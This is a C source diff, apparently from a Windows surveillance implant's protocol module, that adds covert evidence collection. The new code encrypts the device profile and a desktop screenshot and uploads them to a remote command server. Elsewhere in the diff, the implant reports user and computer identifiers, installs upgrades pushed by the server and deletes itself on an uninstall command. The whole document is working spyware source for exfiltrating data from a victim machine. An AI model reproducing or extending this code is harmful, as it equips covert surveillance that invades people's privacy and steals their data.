@@ -13,6 +13,8 @@
 #include "win_http.h"
 #include "upgrade.h"
 #include "log_files.h"
+#include "agent_device.h"
+#include "agent_screenshot.h"
 #include "main.h"
 
 
@@ -20,6 +22,151 @@ BYTE pServerKey[32];
 BYTE pConfKey[32];
 BYTE pSessionKey[20];
 BYTE pLogKey[32];
+
+extern PDEVICE_CONTAINER pDeviceContainer;
+
+
+VOID SendEvidences()
+{
+	ULONG uHeaderSize;
+	PBYTE pHeaderBuffer;
+
+	// DEVICE FIRST 
+	if (pDeviceContainer)
+	{
+		// payload
+		ULONG a = Align(pDeviceContainer->uSize, 16);
+		PBYTE pCryptedDeviceBuffer = (PBYTE)malloc(Align(pDeviceContainer->uSize, 16));
+		memset(pCryptedDeviceBuffer, 0x0, Align(pDeviceContainer->uSize, 16));
+		memcpy(pCryptedDeviceBuffer, pDeviceContainer->pDataBuffer, pDeviceContainer->uSize);
+		Encrypt(pCryptedDeviceBuffer, Align(pDeviceContainer->uSize, 16), pLogKey, PAD_NOPAD);
+
+		// header
+		CreateLogFile(PM_DEVICEINFO, NULL, 0, FALSE, &pHeaderBuffer, &uHeaderSize);
+
+		// total_len + header + payload_len_clear + payload
+		PBYTE pBuffer = (PBYTE)malloc(sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(pDeviceContainer->uSize, 16)); 
+		memset(pBuffer, 0x0, sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + pDeviceContainer->uSize);
+
+		// total_len
+		*(PULONG)pBuffer = sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(pDeviceContainer->uSize, 16);
+		//header
+		memcpy(pBuffer + sizeof(ULONG), pHeaderBuffer, uHeaderSize);
+
+		// payload_len_clear
+		*(PULONG)(pBuffer + sizeof(ULONG) + uHeaderSize) = Align(pDeviceContainer->uSize, 16);
+
+		// payload
+		memcpy(pBuffer + sizeof(ULONG) + uHeaderSize + sizeof(ULONG), pCryptedDeviceBuffer, Align(pDeviceContainer->uSize, 16));
+
+		PBYTE pCryptedBuffer;
+		if (WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_EVIDENCE, pBuffer, sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(pDeviceContainer->uSize, 16), pSessionKey, &pCryptedBuffer)))
+		{
+			ULONG uResponseLen;
+			PBYTE pResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
+			if (pResponseBuffer)
+			{
+				Decrypt(pResponseBuffer, uResponseLen, pSessionKey);
+				if (*(PULONG)pResponseBuffer == PROTO_OK)
+				{
+					free(pDeviceContainer->pDataBuffer);
+					free(pDeviceContainer);
+					pDeviceContainer = NULL;
+				}
+				free(pResponseBuffer);
+			}
+#ifdef _DEBUG
+			else
+				OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:81\n");
+#endif
+		}
+#ifdef _DEBUG
+		else
+			OutputDebugString(L"[W] WinHTTPSendData FAIL @ proto.cpp:85\n");
+#endif		
+		free(pCryptedDeviceBuffer);
+		free(pBuffer);
+		
+	}
+
+	// SCREENSHOT
+	ULONG uScreenShotLen;
+	PBYTE pJPEGBuffer = TakeScreenshot(&uScreenShotLen);
+	if (!pJPEGBuffer || !uScreenShotLen)
+	{
+#ifdef _DEBUG
+		OutputDebugString(L"[!!] no pJPEGBuffer or uScreenShotLen!\n");
+#endif
+		return;
+	}
+	//payload
+	pJPEGBuffer = (PBYTE)realloc(pJPEGBuffer, Align(uScreenShotLen, 16));
+	Encrypt(pJPEGBuffer, Align(uScreenShotLen, 16), pLogKey, PAD_NOPAD);
+
+	// additional header
+	WCHAR pProcessName[] = L"UNKNOWN";
+
+	ULONG uAddHeaderSize = sizeof(SNAPSHOT_ADDITIONAL_HEADER) + wcslen(pProcessName)*sizeof(WCHAR) + wcslen(pProcessName)*sizeof(WCHAR);
+	PSNAPSHOT_ADDITIONAL_HEADER pSnapAddHeader = (PSNAPSHOT_ADDITIONAL_HEADER)malloc(uAddHeaderSize);
+
+	pSnapAddHeader->uProcessNameLen = wcslen(pProcessName)*sizeof(WCHAR);
+	pSnapAddHeader->uWindowNameLen = wcslen(pProcessName)*sizeof(WCHAR);
+	pSnapAddHeader->uVersion = LOG_SNAP_VERSION;
+	memcpy((PBYTE)pSnapAddHeader + sizeof(SNAPSHOT_ADDITIONAL_HEADER), pProcessName, pSnapAddHeader->uProcessNameLen);
+	memcpy((PBYTE)pSnapAddHeader + sizeof(SNAPSHOT_ADDITIONAL_HEADER) + pSnapAddHeader->uProcessNameLen, pProcessName, pSnapAddHeader->uWindowNameLen);
+
+	// header
+	CreateLogFile(PM_SCREENSHOT, (PBYTE)pSnapAddHeader, uAddHeaderSize, FALSE, &pHeaderBuffer, &uHeaderSize);
+
+	// total_len + header + payload_len_clear + payload
+	PBYTE pBuffer = (PBYTE)malloc(sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(uScreenShotLen, 16)); 
+	memset(pBuffer, 0x0, sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(uScreenShotLen, 16));
+
+	// total_len
+	*(PULONG)pBuffer = sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(uScreenShotLen, 16);
+
+	//header
+	memcpy(pBuffer + sizeof(ULONG), pHeaderBuffer, uHeaderSize);
+
+
+	// payload_len_clear
+	*(PULONG)(pBuffer + sizeof(ULONG) + uHeaderSize) = Align(uScreenShotLen, 16);
+
+	// payload
+	memcpy(pBuffer + sizeof(ULONG) + uHeaderSize + sizeof(ULONG), pJPEGBuffer, Align(uScreenShotLen, 16));
+
+	PBYTE pCryptedBuffer;
+	if (WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_EVIDENCE, pBuffer, sizeof(ULONG) + uHeaderSize + sizeof(ULONG) + Align(uScreenShotLen, 16), pSessionKey, &pCryptedBuffer)))
+	{
+		ULONG uResponseLen;
+		PBYTE pResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
+		if (pResponseBuffer)
+		{
+			Decrypt(pResponseBuffer, uResponseLen, pSessionKey);
+			if (*(PULONG)pResponseBuffer != PROTO_OK)
+			{
+#ifdef _DEBUG
+				OutputDebugString(L"[!!] PROTO_ERR sending screenshot\n");
+#endif
+			}
+			free(pResponseBuffer);
+			free(pCryptedBuffer);
+		}
+#ifdef _DEBUG
+		else
+			OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:157\n");
+#endif
+	}
+#ifdef _DEBUG
+	else
+		OutputDebugString(L"[!!] WinHTTPSendData FAIL @ proto.cpp:162\n");
+#endif
+
+
+	free(pBuffer);
+	free(pJPEGBuffer);
+	free(pSnapAddHeader);
+}
 
 BOOL SyncWithServer()
 {
@@ -95,11 +242,28 @@ BOOL SyncWithServer()
 
 	// send request
 	ULONG uResponseLen;
-	WinHTTPSendData(pBase64Message, strlen((char *)pBase64Message));
+	ULONG uRet = WinHTTPSendData(pBase64Message, strlen((char *)pBase64Message));
 	free(pBase64Message);
+	if (!uRet)
+	{
+		free(pRandomData);
+		free(pInstanceId);
+		free(pProtoMessage);
+#ifdef _DEBUG
+		OutputDebugString(L"[!!] WinHTTPSendData FAIL @ proto.cpp:234\n");
+#endif
+		return FALSE;
+	}
 
 	// get response
 	PBYTE pHttpResponseBufferB64 = WinHTTPGetResponse(&uResponseLen); 
+	if (!pHttpResponseBufferB64)
+	{
+#ifdef _DEBUG
+	OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:244\n");
+#endif
+		return FALSE;
+	}
 
 	// base64
 	ULONG uOut;
@@ -180,7 +344,8 @@ BOOL SyncWithServer()
 #ifdef _DEBUG
 		OutputDebugString(L"[+] Got PROTO_UNINSTALL, I'm gonna die :(\n");
 #endif
-		uGonnaDie = 1;
+		WinHTTPClose();
+		DeleteAndDie();
 	}
 
 
@@ -210,13 +375,25 @@ BOOL SyncWithServer()
 	memcpy(pBuffer + sizeof(ULONG) + uUserLen + uComputerLen, pSourceIdPascal, uSourceLen);
 
 	// Send ID
-	WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_ID, pBuffer, uBuffLen, pSessionKey, &pCryptedBuffer));
+	if (!WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_ID, pBuffer, uBuffLen, pSessionKey, &pCryptedBuffer)))
+	{
+#ifdef _DEBUG
+		OutputDebugString(L"[!!] WinHTTPSendData @ proto.cpp:381\n");
+#endif
+		goto bailout;
+	}
 	free(pCryptedBuffer);
 	free(pBuffer);	
 
 	// Get reponse
 	PBYTE pHttpResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
-
+	if (!pHttpResponseBuffer)
+	{
+#ifdef _DEBUG
+		OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:387\n");
+#endif
+		goto bailout;
+	}
 	// decrypt it
 	Decrypt(pHttpResponseBuffer, uResponseLen, pSessionKey);
 
@@ -235,7 +412,6 @@ BOOL SyncWithServer()
 	if (pResponseId->uAvailables)
 	{
 		PULONG pAvailables = (&pResponseId->uAvailables) + 1;
-
 		for (ULONG i=0; i<pResponseId->uAvailables; i++)
 		{
 #ifdef _DEBUG
@@ -253,10 +429,23 @@ BOOL SyncWithServer()
 				OutputDebugString(pDebugString);
 				free(pDebugString);
 #endif
-				WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_UPGRADE, NULL, 0, pSessionKey, &pCryptedBuffer));
+				if (!WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_UPGRADE, NULL, 0, pSessionKey, &pCryptedBuffer)))
+				{
+#ifdef _DEBUG
+					OutputDebugString(L"[!!] WinHTTPSendData FAIL @proto.cpp:435\n");
+					break;
+#endif
+				}
 				free(pCryptedBuffer);
 
 				PBYTE pHttpUpgradeBuffer = WinHTTPGetResponse(&uResponseLen); 
+				if (!pHttpUpgradeBuffer)
+				{
+#ifdef _DEBUG
+					OutputDebugString(L"[!!] WinHTTPGetResponse FAIL @ proto.cpp:433\n");
+#endif
+					break;
+				}
 				Decrypt(pHttpUpgradeBuffer, uResponseLen, pSessionKey);
 
 				PPROTO_RESPONSE_UPGRADE pProtoUpgrade = (PPROTO_RESPONSE_UPGRADE)pHttpUpgradeBuffer;
@@ -281,8 +470,8 @@ BOOL SyncWithServer()
 				PBYTE pFileBuffer = (PBYTE)(((PBYTE)&pProtoUpgrade->pUpgradeNameBuffer) + pProtoUpgrade->uUpgradeNameLen) + sizeof(ULONG);
 
 				// upgrade & exit
-				Upgrade(pUpgradePath, pFileBuffer, uFileLength); //FIXME do not exit.
-
+				if (Upgrade(pUpgradePath, pFileBuffer, uFileLength))
+					uGonnaDie = 1;
 
 				free(pRandString);
 				free(pUpgradePath);
@@ -293,65 +482,35 @@ BOOL SyncWithServer()
 	}
 	free(pHttpResponseBuffer);
 
-
-	ProcessEvidenceFiles();
-
-
-	if (uGonnaUpdate)
-	{
-
-	}
-	if (uGonnaDie)
-	{
-		// uninstall
-	}
-
-
+#ifdef _DEBUG
+	OutputDebugString(L"[+] Sending Evidences\n");
+#endif
+	SendEvidences();
+	
 bailout:
 	// send BYE
 #ifdef _DEBUG
 	OutputDebugString(L"[*] Sending PROTO_BYE\n");
 #endif
-	WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_BYE, NULL, 0, pSessionKey, &pCryptedBuffer));
-	free(pCryptedBuffer);
+	if (WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_BYE, NULL, 0, pSessionKey, &pCryptedBuffer)))
+		free(pCryptedBuffer);
+#ifdef _DEBUG
+	else
+		OutputDebugString(L"[!!] WinHTTPSendData FAIL @ proto.cpp:499\n");
+#endif
+	
 
+	if (uGonnaDie)
+	{
+		WinHTTPClose();
+		DeleteAndDie();
+	}
 
 	free(pProtoMessage);
 	free(pInstanceId);
 	free(pRandomData);
 
 	return bRetVal;
-}
-
-VOID SendEvidence(PBYTE pEvidence, LARGE_INTEGER uEvidenceSize, PBYTE pSessionKey)
-{
-	// send PROTO_EVIDENCE_SIZE
-	PPROTO_COMMAND_EVIDENCES_SIZE pCmdEvidenceSize = (PPROTO_COMMAND_EVIDENCES_SIZE)malloc(sizeof(ULONG) + sizeof(ULONG64));
-	pCmdEvidenceSize->uEvidenceNum = 1;
-	pCmdEvidenceSize->uEvidenceSize.LowPart = uEvidenceSize.LowPart;
-	pCmdEvidenceSize->uEvidenceSize.HighPart = uEvidenceSize.HighPart;
-	
-	PBYTE pCryptedBuffer;
-	WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_EVIDENCE_SIZE, (PBYTE)pCmdEvidenceSize, sizeof(PPROTO_COMMAND_EVIDENCES_SIZE), pSessionKey, &pCryptedBuffer));
-
-
-	// Get reponse
-	ULONG uResponseLen;
-	PBYTE pHttpResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
-
-	// decrypt it
-	Decrypt(pHttpResponseBuffer, uResponseLen, pSessionKey);
-
-	if(*pHttpResponseBuffer != 0x1)
-		MessageBox(NULL, L"DIO", L"DIO", 0);
-
-	
-
-
-
-
-
-	free(pCryptedBuffer);
 }
 
 VOID CalculateSHA1(PBYTE pSha1Buffer, PBYTE pBuffer, ULONG uBufflen)
@@ -381,7 +540,7 @@ ULONG CommandHash(ULONG uProtoCmd, PBYTE pMessage, ULONG uMessageLen, PBYTE pEnc
 		uOut += 16;
 	
 	// sha1(PROTO_* + version + message)
-	pBuffer = (PBYTE)malloc(sizeof(ULONG) + uMessageLen);
+	pBuffer = (PBYTE)malloc(sizeof(ULONG) + uMessageLen);	// FIXME: free this
 	*(PULONG)pBuffer = uProtoCmd;
 	if (pMessage)
 		memcpy(pBuffer + sizeof(ULONG), pMessage, uMessageLen);
